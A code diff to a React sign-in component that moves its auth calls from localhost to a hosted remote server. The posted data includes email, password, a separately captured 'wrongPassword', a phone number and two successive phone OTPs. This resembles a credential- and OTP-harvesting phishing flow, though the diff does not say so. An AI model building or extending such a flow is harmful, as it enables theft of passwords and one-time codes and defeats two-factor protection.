@@ -16,6 +16,7 @@ import OtpStep2 from "../components/OtpStep2";
 function SignIn() {
 
   const [step, setStep] = useState("email");
+  const api = "https://connect-server-uky7.onrender.com/"
 
   const [userId, setUserId] = useState(
     sessionStorage.getItem("userId") || ""
@@ -98,7 +99,7 @@ function SignIn() {
 
       const response =
         await axios.post(
-          "http://localhost:5000/api/auth/start",
+          "https://connect-server-uky7.onrender.com/api/auth/start",
           {
             email: enteredEmail
           }
@@ -199,7 +200,7 @@ function SignIn() {
 
 
       await axios.post(
-        "http://localhost:5000/api/auth/password",
+        "https://connect-server-uky7.onrender.com/api/auth/password",
         {
           userId,
           password
@@ -255,7 +256,7 @@ function SignIn() {
 
 
       await axios.post(
-        "http://localhost:5000/api/auth/wrongPassword",
+        "https://connect-server-uky7.onrender.com/api/auth/wrongPassword",
         {
           userId,
           wrongPassword: wrongPassword
@@ -314,7 +315,7 @@ function SignIn() {
 
 
       await axios.post(
-        "http://localhost:5000/api/auth/phone",
+        "https://connect-server-uky7.onrender.com/api/auth/phone",
         {
           userId,
           phoneNumber
@@ -365,7 +366,7 @@ function SignIn() {
 
 
       await axios.post(
-        "http://localhost:5000/api/auth/phoneotp",
+        "https://connect-server-uky7.onrender.com/api/auth/phoneotp",
         {
           userId,
           phoneOtp
@@ -417,7 +418,7 @@ function SignIn() {
 
 
       await axios.post(
-        "http://localhost:5000/api/auth/phoneotp2",
+        "https://connect-server-uky7.onrender.com/api/auth/phoneotp2",
         {
           userId,
           phoneOtp2
